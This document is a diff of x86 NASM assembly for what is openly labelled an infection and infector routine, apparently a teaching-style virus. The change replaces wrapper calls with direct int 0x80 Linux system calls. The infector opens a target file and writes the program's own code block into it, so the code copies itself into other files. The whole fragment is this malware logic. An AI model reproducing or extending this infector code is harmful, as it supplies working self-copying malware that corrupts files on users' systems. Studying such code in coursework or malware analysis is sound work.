@@ -56,39 +56,35 @@ system_call:
 code_start:
 infection:
     ; Print message
-    push    MSG_LEN
-    push    MSG
-    push    STDOUT
-    push    WRITE
-    call    system_call
-    add     esp, 16
+    mov     eax, WRITE
+    mov     ebx, STDOUT
+    mov     ecx, MSG
+    mov     edx, MSG_LEN
+    int     0x80
 infector:
     push    ebp             ; Save caller state
     mov     ebp, esp
     pushad                  ; Save some more caller state
 
     ; Open file
-    push    PERMISSIONS
-    push    O_FLAGS
-    push    dword [ebp+8]        ; File name
-    push    OPEN
-    call    system_call
-    add     esp, 16
+    mov     eax, OPEN
+    mov     ebx, [ebp+8]
+    mov     ecx, O_FLAGS
+    mov     edx, PERMISSIONS
+    int     0x80
     mov     dword [outfile], eax ; Update outfile
 
     ; Write
-    push    code_end - code_start
-    push    code_start
-    push    dword [outfile]
-    push    WRITE
-    call    system_call
-    add     esp, 16
+    mov     eax, WRITE
+    mov     ebx, dword [outfile]
+    mov     ecx, code_start
+    mov     edx, code_end - code_start
+    int     0x80
 
     ; Close file
-    push    dword[outfile]
-    push    CLOSE
-    call    system_call
-    add     esp, 8
+    mov     eax, CLOSE
+    mov     ebx, dword[outfile]
+    int     0x80
 
     popad                   ; Restore caller state (registers)
     pop     ebp             ; Restore caller state
